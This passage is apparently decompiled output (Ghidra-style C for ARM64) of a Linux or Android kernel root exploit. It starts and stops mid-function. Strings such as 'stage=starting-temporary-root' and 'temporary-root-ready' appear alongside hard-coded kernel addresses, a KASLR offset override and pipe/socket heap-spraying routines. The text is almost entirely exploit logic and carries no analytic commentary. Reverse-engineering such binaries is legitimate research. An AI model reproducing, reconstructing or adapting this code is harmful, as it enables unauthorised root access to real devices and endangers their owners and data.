  syscall(0x62,param_1,param_2 & 0xffffffff,param_3 & 0xffffffff,0,0,0);
  return;
}



// ==== FUN_001072e4 @ 001072e4 size=80 ====

undefined8 FUN_001072e4(long *param_1)

{
  int iVar1;
  
  iVar1 = FUN_001072a4(*param_1 + param_1[1] + 0x60,0x80,0);
  if (iVar1 != -1) {
    free(param_1);
    return 0;
  }
  FUN_001048f8();
                    /* WARNING: Subroutine does not return */
  FUN_00104934();
}



// ==== FUN_00107334 @ 00107334 size=60 ====

void FUN_00107334(void)

{
  long lVar1;
  undefined8 uStack0000000000000108;
  
  lVar1 = tpidr_el0;
  uStack0000000000000108 = *(undefined8 *)(lVar1 + 0x28);
  memset(&stack0x00000008,0x41,0x100);
  return;
}



// ==== FUN_00107370 @ 00107370 size=12 ====

void FUN_00107370(void)

{
  return;
}



// ==== FUN_0010737c @ 0010737c size=24 ====

void FUN_0010737c(void)

{
  FUN_00105e18();
  return;
}



// ==== FUN_00107394 @ 00107394 size=32 ====

void FUN_00107394(void)

{
  syscall(0xdc,0x11,0,0,0,0);
  return;
}



// ==== FUN_001073b4 @ 001073b4 size=28 ====

void FUN_001073b4(int param_1)

{
  FUN_00104a28(0x400,3,(long)param_1,4,0,0);
  return;
}



// ==== FUN_001073d0 @ 001073d0 size=20 ====

void FUN_001073d0(void)

{
  FUN_00105e18();
  return;
}



// ==== FUN_001073e4 @ 001073e4 size=20 ====

void FUN_001073e4(void)

{
  FUN_00105e18();
  return;
}



// ==== FUN_001073f8 @ 001073f8 size=24 ====

void FUN_001073f8(undefined4 *param_1)

{
  undefined4 unaff_w21;
  
  *param_1 = 0;
  FUN_00105e84(unaff_w21);
  return;
}



// ==== FUN_00107410 @ 00107410 size=32 ====

void FUN_00107410(void)

{
  return;
}



// ==== FUN_00107430 @ 00107430 size=24 ====

int FUN_00107430(void)

{
  int iVar1;
  int unaff_w19;
  long unaff_x20;
  long unaff_x23;
  
  *(undefined1 *)(unaff_x23 + unaff_x20) = 0;
  iVar1 = ioctl(unaff_w19,0x41007701,&stack0x00000008);
  return iVar1;
}



// ==== FUN_00107448 @ 00107448 size=28 ====

undefined4 FUN_00107448(void)

{
  undefined4 unaff_w21;
  undefined4 *unaff_x23;
  
  *unaff_x23 = 0;
  return unaff_w21;
}



// ==== FUN_00107464 @ 00107464 size=12 ====

void FUN_00107464(undefined8 param_1)

{
  FUN_00105d50(param_1,&DAT_001020bc);
  return;
}



// ==== FUN_00107470 @ 00107470 size=12 ====

void FUN_00107470(void)

{
  return;
}



// ==== FUN_0010747c @ 0010747c size=8 ====

void FUN_0010747c(undefined8 param_1,undefined8 param_2)

{
  FUN_00105e20(param_1,param_2,0);
  return;
}



// ==== FUN_00107484 @ 00107484 size=8 ====

void FUN_00107484(void)

{
  sysconf(0x61);
  return;
}



// ==== FUN_0010748c @ 0010748c size=12 ====

void FUN_0010748c(void)

{
  return;
}



// ==== FUN_00107498 @ 00107498 size=16 ====

void FUN_00107498(void)

{
  return;
}



// ==== FUN_001074a8 @ 001074a8 size=16 ====

int FUN_001074a8(void)

{
  int iVar1;
  int *in_x3;
  
  iVar1 = socketpair(1,1,0,in_x3);
  return iVar1;
}



// ==== FUN_001074b8 @ 001074b8 size=24 ====

void FUN_001074b8(void)

{
  return;
}



// ==== FUN_001074d0 @ 001074d0 size=24 ====

void FUN_001074d0(void)

{
  return;
}



// ==== FUN_001074e8 @ 001074e8 size=8 ====

void FUN_001074e8(long param_1)

{
  long unaff_x25;
  
  FUN_00106008(*(undefined4 *)(param_1 + unaff_x25 * 4));
  return;
}



// ==== FUN_001074f0 @ 001074f0 size=12 ====

void FUN_001074f0(undefined8 param_1)

{
  FUN_00105d50(param_1,&DAT_00101f48);
  return;
}



// ==== FUN_001074fc @ 001074fc size=12 ====

void FUN_001074fc(void)

{
  return;
}



// ==== FUN_00107508 @ 00107508 size=12 ====

void FUN_00107508(void)

{
  return;
}



// ==== FUN_00107514 @ 00107514 size=20 ====

void FUN_00107514(void)

{
  DAT_0010d998 = 0;
  return;
}



// ==== FUN_00107528 @ 00107528 size=12 ====

void FUN_00107528(void)

{
  long unaff_x19;
  long unaff_x21;
  
  FUN_00106008(*(undefined4 *)(*(long *)(unaff_x21 + 8) + unaff_x19 * 4));
  return;
}



// ==== FUN_00107534 @ 00107534 size=12 ====

int FUN_00107534(void)

{
  int iVar1;
  int unaff_w19;
  
  iVar1 = close(unaff_w19);
  return iVar1;
}



// ==== FUN_00107540 @ 00107540 size=8 ====

void FUN_00107540(undefined8 param_1,size_t param_2)

{
  calloc(4,param_2);
  return;
}



// ==== FUN_00107548 @ 00107548 size=12 ====

int FUN_00107548(void)

{
  int iVar1;
  
  iVar1 = prctl(1,9);
  return iVar1;
}



// ==== FUN_00107554 @ 00107554 size=20 ====

void FUN_00107554(void)

{
  long lVar1;
  long unaff_x29;
  
  lVar1 = tpidr_el0;
  *(undefined8 *)(unaff_x29 + -8) = *(undefined8 *)(lVar1 + 0x28);
  return;
}



// ==== FUN_00107568 @ 00107568 size=20 ====

void FUN_00107568(void)

{
  return;
}



// ==== FUN_0010757c @ 0010757c size=324 ====

void FUN_0010757c(void)

{
  long lVar1;
  int iVar2;
  char *pcVar3;
  int *piVar4;
  ulonglong uVar5;
  char *pcVar6;
  char *local_48;
  char *local_40;
  long local_38;
  
  lVar1 = tpidr_el0;
  local_38 = *(long *)(lVar1 + 0x28);
  pcVar3 = getenv("SLIDE_P0_OFFSET");
  if ((pcVar3 == (char *)0x0) || (*pcVar3 == '\0')) {
    local_40 = (char *)0x0;
    DAT_0010d9a8 = 0;
    iVar2 = FUN_0010597c(&local_40);
    if (iVar2 == 0) goto LAB_00107694;
    pcVar6 = "tracefs-canonical";
    pcVar3 = local_40;
  }
  else {
    local_40 = (char *)0x0;
    piVar4 = (int *)__errno();
    *piVar4 = 0;
    uVar5 = strtoull(pcVar3,&local_40,0);
    if ((((*piVar4 != 0) || (local_40 == pcVar3)) || (*local_40 != '\0')) ||
       ((0x1f0000 < uVar5 || ((uVar5 & 0xffff) != 0)))) {
LAB_00107694:
      fwrite(&DAT_00102155,0x1e,1,*(FILE **)PTR_stderr_0010c2c8);
                    /* WARNING: Subroutine does not return */
      exit(-1);
    }
    local_48 = (char *)0x0;
    DAT_0010d9a8 = uVar5;
    iVar2 = FUN_0010597c(&local_48);
    if (iVar2 == 0) {
      pcVar6 = "forced-p0";
      pcVar3 = (char *)(uVar5 - 0x3ff8000000);
    }
    else {
      pcVar6 = "tracefs+forced-p0";
      pcVar3 = local_48;
    }
  }
  FUN_00105dc0(pcVar3,pcVar6);
  if (*(long *)(lVar1 + 0x28) == local_38) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_001076c0 @ 001076c0 size=1468 ====

/* WARNING: Type propagation algorithm not settling */

void FUN_001076c0(void)

{
  long lVar1;
  long lVar2;
  long lVar3;
  bool bVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  ulong uVar8;
  long lVar9;
  long lVar10;
  long lVar11;
  long lVar12;
  undefined8 uVar13;
  long lVar14;
  undefined4 uVar15;
  long extraout_x8;
  long extraout_x8_00;
  long extraout_x8_01;
  long extraout_x9;
  long extraout_x9_00;
  ulong uVar16;
  undefined1 auVar17 [16];
  undefined8 local_110;
  long local_108;
  long local_100;
  long local_f8;
  long local_f0;
  long local_e8;
  long local_e0;
  long local_d8 [4];
  undefined7 uStack_b8;
  undefined4 local_b1;
  char local_a0 [8];
  char acStack_98 [8];
  char acStack_90 [8];
  undefined7 uStack_88;
  char local_81;
  undefined3 uStack_80;
  long local_70;
  
  lVar1 = tpidr_el0;
  local_70 = *(long *)(lVar1 + 0x28);
  DAT_0010da38 = DAT_0010da38 + 1;
  iVar5 = puts("\x1b[33m[*] \x1b[0mstage=verifying-kernel-access");
  uVar8 = FUN_00105968(iVar5);
  iVar5 = (int)uVar8;
  if (iVar5 < 0) {
    DAT_0010da40 = 0xb;
LAB_00107794:
    uVar13 = 0;
    goto LAB_0010792c;
  }
  lVar12 = DAT_0010d9a8 + -0x7fd54030d8;
  if (DAT_0010da48 != 0) {
    lVar12 = DAT_0010da68 + 0x2bfcf28;
  }
  uVar16 = uVar8 & 0xffffffff;
  local_f0 = 0;
  lVar9 = FUN_00107138(uVar8,lVar12,&local_f0,8);
  if (lVar9 == 8 && local_f0 == DAT_0010d9d0) {
    acStack_98[0] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[8];
    acStack_98[1] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[9];
    acStack_98[2] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[10];
    acStack_98[3] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0xb];
    acStack_98[4] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0xc];
    acStack_98[5] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0xd];
    acStack_98[6] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0xe];
    acStack_98[7] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0xf];
    local_a0[0] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0];
    local_a0[1] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[1];
    local_a0[2] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[2];
    local_a0[3] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[3];
    local_a0[4] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[4];
    local_a0[5] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[5];
    local_a0[6] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[6];
    local_a0[7] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[7];
    uStack_88 = (undefined7)s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43._24_8_;
    _local_81 = CONCAT31(0x4b4f,SUB81(s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43._24_8_,7));
    acStack_90[0] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0x10];
    acStack_90[1] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0x11];
    acStack_90[2] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0x12];
    acStack_90[3] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0x13];
    acStack_90[4] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0x14];
    acStack_90[5] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0x15];
    acStack_90[6] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0x16];
    acStack_90[7] = s_CFI_FRIENDLY_CONFIGFS_BIN_WRITE__00101b43[0x17];
    lVar10 = FUN_00107058(uVar16,DAT_0010d9b0,local_a0,0x23);
    lVar9 = DAT_0010d9d0;
    if (lVar10 == 0x23) {
      lVar10 = -0x3ff7b442cc;
      if (DAT_0010da48 != 0) {
        lVar10 = DAT_0010da68 + 0x4bbd34;
      }
      FUN_00107c8c(lVar10,0x23,DAT_0010d9d0 + 8,local_d8);
      local_e0 = 0;
      local_d8[0] = extraout_x8;
      lVar10 = FUN_00107058();
      lVar9 = FUN_00107c98(lVar10,lVar9 + 8);
      bVar4 = local_e0 == local_d8[0];
      if ((lVar10 == 8 && lVar9 == 8) && bVar4) {
        local_d8[2] = 0;
        local_d8[1] = 0;
        uStack_b8 = 0;
        local_b1 = 0;
        local_d8[3] = 0;
        lVar11 = FUN_00107138(uVar16,DAT_0010d9b0,local_d8 + 1,0x23);
        if ((lVar11 != 0x23) || (iVar6 = memcmp(local_d8 + 1,local_a0,0x23), iVar6 != 0)) {
          uVar15 = 3;
          goto LAB_00107898;
        }
        local_f8 = -0x3ff5ff2948;
        if (DAT_0010da48 != 0) {
          local_f8 = DAT_0010da68 + 0x200d4b8;
        }
        auVar17 = FUN_00107058(uVar16,lVar12,&local_f8,8);
        if (auVar17._0_8_ != 8) {
          uVar15 = 5;
          goto LAB_00107898;
        }
        FUN_00107c7c(8,auVar17._8_8_,&local_100);
        local_100 = 0;
        auVar17 = FUN_00107138();
        lVar12 = DAT_0010d9a8;
        if (auVar17._0_8_ != 8 || local_100 != local_f8) {
LAB_001079bc:
          uVar15 = 6;
          goto LAB_00107898;
        }
        uVar13 = FUN_00107c8c(DAT_0010da68,auVar17._0_8_,auVar17._8_8_,&DAT_0010da58);
        DAT_0010da50 = extraout_x8_01 + extraout_x9_00;
        FUN_00107138(uVar13,lVar12 + -0x7fd5445638);
        DAT_0010d708 = FUN_00107058(uVar16,lVar12 + -0x7fd5445638,&DAT_0010da50,8);
        FUN_00107138(uVar16,lVar12 + -0x7fd5445638,&DAT_0010da60,8);
        lVar3 = DAT_0010da60;
        lVar2 = DAT_0010da50;
        lVar11 = DAT_0010d9a8;
        lVar12 = DAT_0010d708;
        local_e0 = 0;
        local_d8[0] = 0;
        local_e8 = 1;
        uVar13 = FUN_00107138(uVar16,DAT_0010d9a8 + -0x7fd556e1b0,local_d8,8);
        FUN_00107c8c(uVar13,lVar11 + -0x7fd556e1b0,&local_e8);
        lVar14 = FUN_00107058();
        FUN_00107c98(lVar14,lVar11 + -0x7fd556e1b0);
        if (((lVar12 != 8 || lVar3 != lVar2) || lVar14 != 8) || local_e0 != local_e8) {
          uVar15 = 10;
          goto LAB_00107898;
        }
        if (DAT_0010da48 != 0) {
          uVar7 = puts("\x1b[33m[*] \x1b[0mstage=starting-temporary-root");
          uVar8 = (ulong)uVar7;
          iVar6 = 0;
          DAT_0010da3c = 0;
          do {
            if (iVar6 == -0xc) {
              uVar15 = 8;
              break;
            }
            DAT_0010da3c = DAT_0010da3c + 1;
            if (iVar6 != 0) {
              FUN_00108320(uVar8);
            }
            uVar8 = FUN_00108808(uVar16);
            if (((int)uVar8 != 0) && (uVar8 = FUN_00108fa4(uVar16), (int)uVar8 != 0)) {
              iVar6 = puts("\x1b[32m[+] \x1b[0mstage=temporary-root-ready");
              FUN_00107c7c(iVar6);
              local_108 = 0;
              lVar12 = FUN_00107138();
              if (lVar12 != 8) goto LAB_001079bc;
              lVar12 = -0x3ff5ff2948;
              if (DAT_0010da48 != 0) {
                lVar12 = DAT_0010da68 + 0x200d4b8;
              }
              if (local_108 != lVar12) goto LAB_001079bc;
              FUN_00107c8c(8,DAT_0010d9d0,&local_110);
              local_110 = 0;
              lVar12 = FUN_00107058();
              iVar5 = close(iVar5);
              if (iVar5 == -1) goto LAB_00107c54;
              if (lVar12 == 8) {
                uVar13 = 1;
                DAT_0010da40 = 0;
                DAT_0010da44 = 1;
                goto LAB_0010792c;
              }
              DAT_0010da40 = 7;
              goto LAB_00107794;
            }
            iVar6 = iVar6 + -1;
          } while ((((DAT_0010da88 == 0) || (DAT_0010da8c == 0)) || (DAT_0010da90 == 0)) ||
                  ((DAT_0010da94 == 0 || (uVar15 = 8, DAT_0010da98 == 0))));
          goto LAB_00107898;
        }
        DAT_0010da40 = 9;
        uVar13 = 0xffffff802a00d6b8;
      }
      else {
        uVar15 = 2;
LAB_00107898:
        uVar13 = 0xffffff802a00d6b8;
        DAT_0010da40 = uVar15;
        if (DAT_0010da48 != 0) {
          uVar13 = 0x200d4b8;
        }
      }
      FUN_00107c7c(uVar13);
      local_d8[0] = extraout_x9 + extraout_x8_00;
      auVar17 = FUN_00107058();
      lVar12 = auVar17._0_8_;
      if (lVar12 == 8 && ((lVar10 == 8 && lVar9 == 8) && bVar4)) {
        FUN_00107c7c(lVar12,auVar17._8_8_,&local_e0);
        local_e0 = 0;
        lVar12 = FUN_00107138();
      }
      FUN_00107c8c(lVar12,DAT_0010d9d0,&local_e0);
      local_e0 = 0;
      FUN_00107058();
    }
    else {
      DAT_0010da40 = 1;
    }
  }
  else {
    DAT_0010da40 = 4;
  }
  iVar5 = close(iVar5);
  if (iVar5 == -1) {
LAB_00107c54:
    fwrite(&DAT_00102155,0x1e,1,*(FILE **)PTR_stderr_0010c2c8);
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
  uVar13 = 0;
LAB_0010792c:
  if (*(long *)(lVar1 + 0x28) == local_70) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar13);
}



// ==== FUN_00107c7c @ 00107c7c size=16 ====

undefined4 FUN_00107c7c(void)

{
  undefined4 unaff_w19;
  
  return unaff_w19;
}



// ==== FUN_00107c8c @ 00107c8c size=12 ====

undefined4 FUN_00107c8c(void)

{
  undefined4 unaff_w19;
  
  return unaff_w19;
}



// ==== FUN_00107c98 @ 00107c98 size=16 ====

void FUN_00107c98(undefined8 param_1,undefined8 param_2)

{
  undefined4 unaff_w19;
  
  FUN_00107138(unaff_w19,param_2,&stack0x00000050,8);
  return;
}



// ==== FUN_00107ca8 @ 00107ca8 size=64 ====

void FUN_00107ca8(size_t *param_1,size_t param_2)

{
  void *pvVar1;
  
  *param_1 = param_2;
  pvVar1 = calloc(4,param_2);
  param_1[1] = (size_t)pvVar1;
  pvVar1 = calloc(4,param_2);
  param_1[2] = (size_t)pvVar1;
  return;
}



// ==== FUN_00107ce8 @ 00107ce8 size=48 ====

void FUN_00107ce8(int *param_1,long param_2)

{
  int iVar1;
  
  iVar1 = fcntl(*param_1,0x407,param_2 << 0xc);
  if (iVar1 != -1) {
    return;
  }
  FUN_001048f8();
                    /* WARNING: Subroutine does not return */
  FUN_00104934();
}



// ==== FUN_00107d18 @ 00107d18 size=56 ====

void FUN_00107d18(int *param_1)

{
  int iVar1;
  
  iVar1 = pipe(param_1);
  if (iVar1 != -1) {
    FUN_00107ce8(param_1,2);
    return;
  }
  FUN_001048f8();
                    /* WARNING: Subroutine does not return */
  FUN_00104934();
}



// ==== FUN_00107d50 @ 00107d50 size=8 ====

void FUN_00107d50(undefined8 param_1)

{
  FUN_00107ce8(param_1,0x20);
  return;
}



// ==== FUN_00107d58 @ 00107d58 size=124 ====

void FUN_00107d58(void)

{
  long lVar1;
  bool bVar2;
  int iVar3;
  cpu_set_t local_a8;
  undefined8 local_28;
  
  lVar1 = tpidr_el0;
  local_28 = *(undefined8 *)(lVar1 + 0x28);
  local_a8.__bits[0xf] = 0;
  local_a8.__bits[4] = 0;
  local_a8.__bits[3] = 0;
  local_a8.__bits[6] = 0;
  local_a8.__bits[5] = 0;
  local_a8.__bits[8] = 0;
  local_a8.__bits[7] = 0;
  local_a8.__bits[10] = 0;
  local_a8.__bits[9] = 0;
  local_a8.__bits[0xc] = 0;
  local_a8.__bits[0xb] = 0;
  local_a8.__bits[0xe] = 0;
  local_a8.__bits[0xd] = 0;
  local_a8.__bits[2] = 0;
  local_a8.__bits[1] = 0;
  local_a8.__bits[0] = 1;
  iVar3 = sched_setaffinity(0,0x80,&local_a8);
  bVar2 = iVar3 == -1;
  if (bVar2) {
    FUN_001048f8();
                    /* WARNING: Subroutine does not return */
    FUN_00104934();
  }
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28));
  if (bVar2) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00107dd4 @ 00107dd4 size=1356 ====

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_00107dd4(void)

{
  undefined4 *puVar1;
  int *piVar2;
  long lVar3;
  undefined1 in_ZR;
  undefined1 uVar4;
  int iVar5;
  __pid_t _Var6;
  undefined4 uVar7;
  int iVar8;
  ssize_t sVar9;
  void *__s;
  ulong uVar10;
  long lVar11;
  ulong uVar12;
  msghdr local_130;
  iovec local_f0;
  long local_e0;
  undefined4 *local_d8;
  int *local_d0;
  long local_c8;
  undefined4 *local_c0;
  int *local_b8;
  ulong local_b0;
  undefined4 *local_a8;
  undefined4 *local_a0;
  long local_98;
  undefined4 *local_90;
  undefined4 *puStack_88;
  int local_80;
  int local_7c;
  int local_78;
  int local_74;
  int local_70;
  int local_6c;
  undefined8 local_68;
  
  lVar11 = tpidr_el0;
  local_68 = *(undefined8 *)(lVar11 + 0x28);
  do {
    FUN_00107d18(&DAT_0010db68);
    FUN_00108f98();
  } while (!(bool)in_ZR);
  do {
    FUN_00107d18(&DAT_0010e2e8);
    FUN_00108f98();
  } while (!(bool)in_ZR);
  DAT_0010da70 = 1;
  iVar5 = pipe(&local_80);
  if (iVar5 != -1) {
    _Var6 = fork();
    if (_Var6 == 0) {
      iVar5 = prctl(1,9);
      if (iVar5 != -1) {
        _Var6 = getppid();
        if (_Var6 == 1) {
                    /* WARNING: Subroutine does not return */
          _exit(1);
        }
        iVar5 = close(local_80);
        if ((iVar5 != -1) && (iVar5 = clock_gettime(1,(timespec *)&local_130), iVar5 != -1)) {
          FUN_00107ca8(&local_98,0x400);
          FUN_00107ca8(&local_b0,0xc0);
          FUN_00107ca8(&local_c8,0x1f);
          FUN_00107ca8(&local_e0,0x20);
          uVar10 = local_b0;
          for (; puVar1 = local_a0, uVar12 = uVar10, local_98 != 0; local_98 = local_98 + -1) {
            *local_90 = 0xffffffff;
            local_b0 = uVar10;
            uVar7 = FUN_00106178();
            *puStack_88 = uVar7;
            uVar10 = local_b0;
            local_90 = local_90 + 1;
            puStack_88 = puStack_88 + 1;
          }
          for (; uVar12 != 0; uVar12 = uVar12 - 1) {
            *local_a8 = 0xffffffff;
            uVar7 = FUN_00106178();
            *puVar1 = uVar7;
            local_a8 = local_a8 + 1;
            puVar1 = puVar1 + 1;
          }
          FUN_00105324();
          piVar2 = local_b8;
          for (lVar11 = local_c8; lVar11 != 0; lVar11 = lVar11 + -1) {
            *local_c0 = 0xffffffff;
            iVar5 = FUN_00106178();
            *piVar2 = iVar5;
            local_c0 = local_c0 + 1;
            piVar2 = piVar2 + 1;
          }
          uVar7 = FUN_00105f40();
          piVar2 = local_d0;
          for (lVar11 = local_e0; lVar11 != 0; lVar11 = lVar11 + -1) {
            *local_d8 = 0xffffffff;
            iVar5 = FUN_00106178();
            *piVar2 = iVar5;
            local_d8 = local_d8 + 1;
            piVar2 = piVar2 + 1;
          }
          iVar5 = FUN_00105f94(uVar7);
          for (lVar11 = local_c8; lVar3 = local_e0, lVar11 != 0; lVar11 = lVar11 + -1) {
            FUN_00108f54();
          }
          for (; uVar12 = uVar10, lVar3 != 0; lVar3 = lVar3 + -1) {
            FUN_00108f54();
          }
          for (; uVar12 != 0; uVar12 = uVar12 - 1) {
            FUN_00108f54();
          }
          iVar8 = FUN_00108f48(uVar7);
          if ((iVar8 != -1) && (*(int *)(DAT_0010d998 + 0x10a8) == 2)) {
            __s = malloc(0x8e80);
            memset(__s,0x50,0x8e80);
            iVar8 = FUN_001074a8();
            if ((iVar8 != -1) && (iVar8 = FUN_001074a8(), iVar8 != -1)) {
              local_f0.iov_len = 0x8e80;
              local_130.msg_iov = &local_f0;
              local_130.msg_flags = 0;
              local_130._52_4_ = 0;
              local_130.msg_controllen = 0;
              local_130.msg_control = (void *)0x0;
              local_130.msg_namelen = 0;
              local_130._12_4_ = 0;
              local_130.msg_name = (void *)0x0;
              local_130.msg_iovlen = 1;
              local_f0.iov_base = __s;
              sVar9 = sendmsg(local_78,&local_130,0);
              if (sVar9 != -1) {
                FUN_00107d58();
                sched_yield();
                sched_yield();
                sched_yield();
                sched_yield();
                for (; piVar2 = local_d0, local_c8 != 0; local_c8 = local_c8 + -1) {
                  iVar8 = close(*local_b8);
                  if (iVar8 == -1) goto LAB_00108310;
                  *local_b8 = -1;
                  local_b8 = local_b8 + 1;
                }
                while (local_e0 + -1 != 0) {
                  iVar8 = close(*piVar2);
                  if (iVar8 == -1) goto LAB_00108310;
                  *piVar2 = -1;
                  piVar2 = piVar2 + 1;
                  local_e0 = local_e0 + -1;
                }
                if (uVar10 != 0) {
                  uVar12 = 0;
                  do {
                    iVar8 = close(local_a0[uVar12]);
                    if (iVar8 == -1) goto LAB_00108310;
                    local_a0[uVar12] = 0xffffffff;
                    uVar12 = uVar12 + 0x20;
                  } while (uVar12 < uVar10);
                }
                iVar8 = close(local_78);
                if ((iVar8 != -1) && (iVar8 = close(local_74), iVar8 != -1)) {
                  sched_yield();
                  sched_yield();
                  sched_yield();
                  sched_yield();
                  iVar5 = close(iVar5);
                  if ((iVar5 != -1) && (sVar9 = sendmsg(local_70,&local_130,0), sVar9 != -1)) {
                    FUN_00105348();
                    uVar10 = FUN_00105354();
                    if (uVar10 != 0xffffffffffffffff) {
                      lVar11 = 0;
                      do {
                        FUN_00107d50((long)&DAT_0010db68 + lVar11);
                        lVar11 = lVar11 + 8;
                      } while (lVar11 != 0x780);
                      FUN_00107d58();
                      iVar5 = close(local_70);
                      if ((iVar5 != -1) && (iVar5 = close(local_6c), iVar5 != -1)) {
                        lVar11 = 0;
                        do {
                          FUN_00107d50((long)&DAT_0010e2e8 + lVar11);
                          lVar11 = lVar11 + 8;
                          uVar4 = lVar11 == 0x780;
                        } while (!(bool)uVar4);
                        FUN_0010605c(&local_98);
                        FUN_0010605c(&local_b0);
                        FUN_0010605c(&local_c8);
                        FUN_0010605c(&local_e0);
                        FUN_001060b4(&local_98);
                        FUN_001060b4(&local_b0);
                        FUN_001060b4(&local_c8);
                        FUN_001060b4(&local_e0);
                        free(__s);
                        local_130.msg_name = (void *)(uVar10 & 0xffffffffffff8000);
                        do {
                          close(DAT_0010db68);
                          iVar5 = close(_DAT_0010db6c);
                          _DAT_0010db68 = FUN_00108f98(0xffffffffffffffff,iVar5);
                        } while (!(bool)uVar4);
                        sVar9 = write(local_7c,&local_130,8);
                        if (sVar9 != -1) {
                          do {
                            sleep(0x3c);
                          } while( true );
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    else if ((_Var6 != -1) && (DAT_0010d714 = _Var6, iVar5 = close(local_7c), iVar5 != -1)) {
      local_130.msg_name = (void *)0x0;
      sVar9 = read(local_80,&local_130,8);
      iVar5 = close(local_80);
      if ((iVar5 != -1) && (sVar9 == 8)) {
        uVar4 = 1;
        do {
          close(DAT_0010db68);
          iVar5 = close(_DAT_0010db6c);
          _DAT_0010db68 = FUN_00108f98(0xffffffffffffffff,iVar5);
        } while (!(bool)uVar4);
        FUN_00107370(*(undefined8 *)(lVar11 + 0x28),local_130.msg_name);
        if (!(bool)uVar4) {
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
        return;
      }
    }
  }
LAB_00108310:
  FUN_001048f8();
                    /* WARNING: Subroutine does not return */
  FUN_00104934();
}



// ==== FUN_00108320 @ 00108320 size=244 ====

ulong FUN_00108320(void)

{
  uint uVar1;
  ulong uVar2;
  long lVar3;
  
  uVar2 = (ulong)DAT_0010d714;
  if (0 < (int)DAT_0010d714) {
    kill(DAT_0010d714,9);
    uVar2 = FUN_00108f48(DAT_0010d714);
    DAT_0010d714 = 0xffffffff;
  }
  if (DAT_0010da70 == '\x01') {
    lVar3 = 0;
    do {
      close(*(int *)((long)&DAT_0010db68 + lVar3));
      close(*(int *)(&DAT_0010db6c + lVar3));
      lVar3 = lVar3 + 8;
    } while (lVar3 != 0x780);
    lVar3 = 0;
    do {
      close(*(int *)((long)&DAT_0010e2e8 + lVar3));
      uVar1 = close(*(int *)((long)&DAT_0010e2ec + lVar3));
      uVar2 = (ulong)uVar1;
      lVar3 = lVar3 + 8;
    } while (lVar3 != 0x780);
    DAT_0010da70 = '\0';
  }
  DAT_0010dae0 = 0;
  DAT_0010daa0 = 0;
  DAT_0010da88 = 0;
  DAT_0010dab0 = 0;
  DAT_0010daa8 = 0;
  DAT_0010dab8 = 0;
  DAT_0010da74 = 0;
  DAT_0010d710 = 0xffffffff;
  DAT_0010d770 = 0;
  DAT_0010d774 = 0;
  return uVar2;
}



// ==== FUN_00108604 @ 00108604 size=220 ====

void FUN_00108604(undefined4 param_1,long param_2,long param_3,int param_4,int param_5)

{
  long lVar1;
  bool bVar2;
  ulong uVar3;
  long local_60;
  uint local_58;
  int iStack_54;
  long local_50;
  undefined8 local_48;
  undefined8 uStack_40;
  undefined8 local_38;
  
  lVar1 = tpidr_el0;
  local_38 = *(undefined8 *)(lVar1 + 0x28);
  local_60 = (param_3 + 0x8000000000U >> 0xc) * 0x40 + -0x200000000;
  iStack_54 = 0;
  if (param_5 == 0) {
    iStack_54 = param_4 + 1;
  }
  local_58 = (uint)param_3 & 0xfff;
  uVar3 = 0xfffffffffffff800;
  uStack_40 = 0;
  local_50 = -0x3ff61809a0;
  if (DAT_0010da48 != 0) {
    local_50 = DAT_0010da68 + 0x1e7f460;
  }
  local_48 = 0x10;
  do {
    uVar3 = uVar3 + 0x800;
    FUN_00107058(param_1,uVar3 + param_2,&local_60,0x28);
    bVar2 = uVar3 >> 0xb == 0xf;
  } while (uVar3 >> 0xb < 0xf);
  FUN_00107370(*(undefined8 *)(lVar1 + 0x28));
  if (bVar2) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_001086e0 @ 001086e0 size=396 ====

ulong FUN_001086e0(undefined8 param_1,undefined8 param_2,ulong param_3,ulong param_4)

{
  undefined1 uVar1;
  undefined1 in_ZR;
  bool bVar2;
  long lVar3;
  ulong uVar4;
  ulong extraout_x8;
  long extraout_x8_00;
  long unaff_x19;
  undefined4 *unaff_x23;
  long unaff_x25;
  undefined1 auVar5 [16];
  
  FUN_00108f84();
  uVar4 = 0;
  if ((bool)in_ZR) {
    auVar5 = FUN_00108f70();
    uVar4 = extraout_x8;
    if ((auVar5._8_8_ != 0) && (-1 < DAT_0010d710)) {
      if ((param_4 & 0xfff) + unaff_x19 < 0x1001) {
